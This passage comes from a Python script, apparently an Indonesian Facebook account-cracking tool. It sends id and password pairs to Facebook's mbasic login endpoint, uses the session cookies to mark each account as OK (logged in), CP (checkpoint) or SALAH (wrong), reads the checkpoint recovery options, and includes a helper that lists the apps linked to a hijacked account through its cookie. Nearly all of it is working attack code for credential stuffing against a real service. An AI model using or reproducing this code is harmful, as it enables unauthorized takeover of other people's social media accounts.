			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
# alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}Alvino Sehat Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang{x}')
	time.sleep(3)
	login()